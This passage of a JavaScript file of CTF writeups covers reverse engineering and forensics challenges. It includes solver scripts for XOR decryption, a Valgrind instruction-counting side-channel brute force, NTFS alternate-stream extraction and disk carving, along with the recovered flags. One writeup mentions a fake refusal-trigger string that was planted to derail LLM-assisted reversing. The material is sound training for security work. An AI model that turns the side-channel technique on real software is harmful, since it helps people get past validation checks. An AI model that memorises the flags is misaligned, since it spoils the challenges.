* \`{\` (ASCII 123) ^ \`90\` = \`33\` (**!**)

The repeating XOR key is **\`RAM!\`**.

By applying this 4-character repeating key to the entire \`ENC\` array, the original string is fully decrypted, revealing the flag.

## Complete Solver Script

Here is the complete, copy-paste-ready Python script that automates both the \`.class\` decryption and the final flag extraction.

\`\`\`python
import binascii

def solve():
    print("[*] Starting VulnByDefault Secret Vault Solver...")

    # Step 1: Decrypt the hidden FlagKeeper.class (Optional verification step)
    key_hex = "eff263f8cc440753acf1c01d02b3756b"
    key_bytes = binascii.unhexlify(key_hex)
    data_path = "META-INF/.classes/com.vulnbydefault.ctf.FlagKeeper"
    
    try:
        with open(data_path, 'rb') as f:
            data = f.read()
        decrypted_class = bytes([data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data))])
        if decrypted_class.startswith(b'\\xca\\xfe\\xba\\xbe'):
            print("[+] Successfully verified FlagKeeper.class decryption (Valid Magic Bytes).")
    except FileNotFoundError:
        print("[-] FlagKeeper.class not found locally, skipping file decryption.")

    # Step 2: Recover the flag from the extracted ENC array
    enc_array = [
        4, 3, 9, 90, 107, 121, 125, 24, 48, 117, 117, 20, 54, 115, 
        44, 66, 48, 118, 126, 24, 100, 35, 126, 19, 106, 34, 121, 
        16, 51, 113, 47, 16, 107, 32, 44, 25, 47
    ]
    
    # KPA derived key
    key = "RAM!"
    
    print(f"[*] Applying KPA derived XOR key: '{key}'")
    flag = "".join(chr(enc_array[i] ^ ord(key[i % len(key)])) for i in range(len(enc_array)))
    
    print("\\n" + "="*50)
    print(f"[!!!] FLAG RECOVERED: {flag}")
    print("="*50)

if __name__ == "__main__":
    solve()
\`\`\`

## Flag

\`VBD{9809b485d2acb7396b328c41a0b19aa8}\`

---
`
    },
    {
        id: "validator",
        ctfId: "ramadanCTF-2026",
        title: "Validator",
        category: "Reverse Engineering",
        difficulty: "Medium",
        date: "2026-02-24",
        summary: "Defeating OLLVM Control Flow Flattening and dynamic API resolution in a Linux ELF binary using a Valgrind instruction-counting side-channel attack.",
        tags: ["rev", "ollvm", "side-channel", "valgrind", "angr", "gdb"],
        content: `# Validator - Writeup

## Initial Reconnaissance

The challenge provides a 64-bit Linux ELF binary named \`validator\`. Running strings on the binary reveals a few interesting artifacts: an \`___siphash\` symbol, high-entropy garbage strings, and a hilarious fake safety trigger (\`ANTHROPIC_MAGIC_STRING_TRIGGER_REFUSAL_1FAEFB61...\`) clearly designed to troll players using LLMs for reverse engineering.

Attempting to run basic single-byte XOR and Caesar brute-forcing on the suspicious strings yielded nothing, indicating the validation logic was more complex.

Dynamic analysis using \`ltrace\` revealed that the binary hides its imports. Instead of a standard PLT/GOT, it uses \`dlopen(nil, 1)\` and \`dlsym\` to dynamically load standard library functions like \`strlen\`, \`printf\`, and \`fgets\` at runtime. 

## Bypassing the Length Check

When supplying dummy input, \`ltrace\` showed the program calling \`strlen\` and immediately exiting with "Sorry, that's not it," skipping the core validation loop entirely.

To find the exact required length, we attached GDB, trapped the \`strlen\` call, and stepped into the binary's validation logic:

\`\`\`assembly
    =>  0x555555556502 < hIKCTDqsfNLU + 2626 >: sub    $0x44,% rax
        0x555555556506 < hIKCTDqsfNLU + 2630 >: setne % al
\`\`\`

The binary subtracts \`0x44\` (68 in decimal) from the returned length. Since \`fgets\` captures the trailing newline, the target flag format is 67 characters long.

## The State Explosion (OLLVM)

With the exact length known (and knowing the standard flag prefix \`VBD{\`), we attempted symbolic execution using \`angr\`. However, \`angr\` immediately began throwing hundreds of unconstrained state errors: \` < BV64 unconstrained_ret_dlsym...> \`.

Looking closer at the assembly in GDB revealed why:

\`\`\`assembly
0x555555556509: lea - 0x249(% rip),% rcx
0x555555556510: mov % rcx, -0x18(% rbp)
0x555555556514: mov - 0x18(% rbp),% rcx
0x555555556518: jmp *% rcx
\`\`\`

The binary is protected by Control Flow Flattening (CFF), likely generated via OLLVM or Hikari. The execution flow is chopped into blocks managed by a central dispatcher, completely blinding symbolic execution engines. 

## The Valgrind Side-Channel Attack

Instead of trying to statically de-flatten the binary, we can bypass the obfuscation entirely using a side-channel instruction counting attack. Because the binary validates the input character-by-character inside the flattened loop, a correct character guess forces the CPU to execute slightly more instructions than an incorrect guess before jumping to the failure state. 

By leveraging Valgrind's \`lackey\` tool, we can deterministically count the exact number of \`guest instrs\` executed for each character permutation.

Here is the complete, copy-paste-ready script used to crack the binary:

\`\`\`python
#!/usr/bin/env python3
import subprocess
import string
import sys
import re
import shutil

# 0x44 in GDB is 68 decimal. 67 characters + 1 newline.
FLAG_LEN = 68
KNOWN_PREFIX = "VBD{"
KNOWN_SUFFIX = "}"

def get_engine():
    print("[+] Running diagnostic to find a working side-channel engine...")
    payload = b"A" * FLAG_LEN + b"\\n"

    if shutil.which("valgrind"):
        cmd = ["valgrind", "--tool=lackey", "--basic-counts=yes", "./validator"]
        proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        _, stderr = proc.communicate(input=payload)
        output = stderr.decode('utf-8', errors='ignore')
        
        # Parse guest instrs format
        if re.search(r'guest instrs:\\s+([0-9,]+)', output):
            print("[+] Valgrind (guest instrs format) is working.")
            return "valgrind_guest"
            
    print("[-] Engine diagnostic failed.")
    sys.exit(1)

def count_instructions(engine, payload):
    cmd = ["valgrind", "--tool=lackey", "--basic-counts=yes", "./validator"]
    proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    _, stderr = proc.communicate(input=payload.encode())
    output = stderr.decode('utf-8', errors='ignore')

    if engine == "valgrind_guest":
        match = re.search(r'guest instrs:\\s+([0-9,]+)', output)
        if match:
            return int(match.group(1).replace(',', ''))
    return 0

def solve():
    engine = get_engine()

    # Initialize the flag array
    flag = list(KNOWN_PREFIX.ljust(FLAG_LEN - 1, '_')) + [KNOWN_SUFFIX]

    print("\\n[+] Starting Side-Channel Attack...")
    print(f"[+] Baseline format: {''.join(flag)}")

    charset = string.ascii_letters + string.digits + "_-@!?"

    # Iterate through the unknown bytes
    for i in range(len(KNOWN_PREFIX), FLAG_LEN - 1):
        max_instr = 0
        best_char = '_'
        baseline = 0
        
        for char in charset:
            flag[i] = char
            payload = "".join(flag) + "\\n"
            
            instr_count = count_instructions(engine, payload)
            
            if baseline == 0:
                baseline = instr_count
                
            if instr_count > max_instr:
                max_instr = instr_count
                best_char = char
                
        # Lock in the highest-instruction character
        flag[i] = best_char
        print(f"[>] Discovered Byte {i:>2}: '{best_char}' | Total Instructions: {max_instr:,} | Current: {''.join(flag)}")
        
    print(f"\\n[!] FLAG CRACKED: {''.join(flag)}")

if __name__ == "__main__":
    solve()
\`\`\`

Running this script progressively leaked the flag, with each correct byte increasing the execution count by roughly 400,000 instructions. On the final byte, execution spiked to over 30 million instructions as the binary finally hit the success branch.

**Flag:** \`VBD{I_kn0w_y0u_w0uld_us3_Opus_hehe_eafa09ad1898e0bcf9c0225076632225}\`
`
    },
    // ─── Paste this into the writeups array in writeups.js ───

    {
        id: "zippy",
        ctfId: "ramadanCTF-2026",
        title: "Zippy",
        category: "Forensics",
        date: "Feb 25, 2026", // Corrected year
        flag: "VBD{c99a11a53a3748269e3f86d7ac38df11}",
        summary: "This challenge utilizes anti-forensics via NTFS Alternate Data Streams (ADS) to hide a decryption key behind a ZIP archive. The solution involves extracting the hidden metadata and solving a compression-related riddle to derive the MD5-hashed password.",
        tags: ["Forensics", "ADS", "NTFS", "ArchiveForensics", "RAR5"],
        content: `
# Zippy — Forensics

## Overview
The challenge provides a \`locked_files.rar\` archive containing an encrypted \`locked_files.zip\`. The goal is to find the hidden key mentioned in the hints:
1. "How much data is lost during compression?"
2. "Don't keep the lock and key at the same place."

## Initial Analysis
Listing the RAR contents reveals an NTFS Alternate Data Stream (ADS) attached to the ZIP file:
- \`locked_files.zip\` (The lock)
- \`locked_files.zip:forgotpassword\` (The key)



The \`forgotpassword\` stream is exactly 32 bytes, which is the standard length of an MD5 hash.

## Extraction
Because Linux (Ext4) does not natively support ADS, standard extraction tools often fail to retrieve the stream data. To successfully access the key, the archive must be extracted on a Windows/NTFS environment.

Using **PowerShell** allows for direct access to the stream:

\`\`\`powershell
# Identify the hidden streams
Get-Item .\\locked_files.zip -Stream *

# Extract the key content
$key = Get-Content .\\locked_files.zip -Stream forgotpassword
# Output: 8d364896e034aabe3fc9fd2e05fb1cbe
\`\`\`

## Solution
The first hint asks how much data is lost during ZIP compression. Since ZIP is a **lossless** format, the answer is **"nothing"**. The extracted key is the MD5 hash of "nothing":

\`echo -n "nothing" | md5sum\` -> \`8d364896e034aabe3fc9fd2e05fb1cbe\`



Using this hash as the password for the ZIP archive successfully unlocks the flag.

## Flag
\`VBD{c99a11a53a3748269e3f86d7ac38df11}\`
`
    },
    {
    id: "bro-is-not-an-astronaut",
    ctfId: "UniVsThreats26 Quals",
    title: "Bro is not an astronaut",
    category: "Forensics",
    date: "Feb 27, 2026",
    flag: "UVT{d0nt_k33p_d1GG1in_U_sur3ly_w0Nt_F1nD_aNythng_:)}",
    summary: "Carved an ext2 cache partition from a raw disk image, extracted unallocated inodes using Sleuth Kit, and brute-forced a sliding-window XOR payload to bypass variable padding.",
    tags: ["disk-image", "ext2", "sleuthkit", "xor", "brute-force", "python"],
    content: `
# Bro is not an astronaut

## Overview
We were given a disk image (\`space_usb.img\`) retrieved from a drifting spaceship. Initial analysis with \`mmls\` and \`binwalk\` revealed a GUID Partition Table containing a suspicious, unrecognizable \`ASTRA9_USER\` partition and an unclean \`ext2\` filesystem named \`ASTRA9_CACHE\`. 

## File Recovery (The Sleuth Kit)
Extracting and analyzing the \`ext2\` partition revealed empty \`/diagnostics\` and \`/tmp\` directories, indicating an intentional wipe. Because it was an \`ext2\` filesystem without a journal, standard tools like \`extundelete\` failed. 

To bypass this, I used **The Sleuth Kit** (\`ils\` and \`icat\`) to manually carve out all unallocated inodes:

\`\`\`bash
# List unallocated inodes and extract them
ils ASTRA9_CACHE.ext2 | awk -F'|' 'NR>1 {print $1}' > inodes.txt
for i in $(cat inodes.txt); do 
    icat ASTRA9_CACHE.ext2 $i > TSK_RECOVERED/inode_$i.bin
done
\`\`\`

## Reversing the Telemetry Format
A recovered plaintext debrief log explained that the station token was split into three fragments (alpha, bravo, charlie), padded, and XOR encrypted with a key named \`diag_key.bin\`. 

Hex analysis of the fragments revealed a 7-byte \`TLM\` header. However, the padding was highly variable, and the encrypted payloads were hidden at unpredictable offsets within the files. Standard offset alignment decryption resulted in garbage data.

## Solution: Sliding Window Brute-Force
To bypass the unpredictable padding, I wrote a Python script to perform a sliding-window XOR brute-force. It tested every small recovered binary as a potential key, XORed every possible byte offset of the telemetry fragments, and extracted the longest continuous string of printable ASCII characters.

\`\`\`python
import os
import glob
import string

def xor_data(data, key):
    if not key: return data
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# ... (Fragment and key loading logic) ...

valid_chars = set((string.ascii_letters + string.digits + string.punctuation).encode('ascii'))

for key_name, key_data in keys:
    for f_name, seq, data in fragments:
        found_strings = []
        
        # Test every possible start offset for the encrypted payload
        for offset in range(7, len(data)):
            decrypted = xor_data(data[offset:], key_data)
            
            # Find longest continuous sequence of valid ASCII
            prefix = bytearray()
            for b in decrypted:
                if b in valid_chars:
                    prefix.append(b)
                else:
                    break # Hit trailing padding
                    
            clean_str = prefix.decode('ascii', errors='ignore')
            if len(clean_str) >= 5: 
                found_strings.append((offset, clean_str))
\`\`\`

Executing the script identified \`inode_20.bin\` (a 16-byte file) as the correct XOR key. The script successfully extracted the three token parts, bypassing both the prepended and trailing padding to yield the final station override code.

## Flag
\`UVT{d0nt_k33p_d1GG1in_U_sur3ly_w0Nt_F1nD_aNythng_:)}\`
`
    }
];
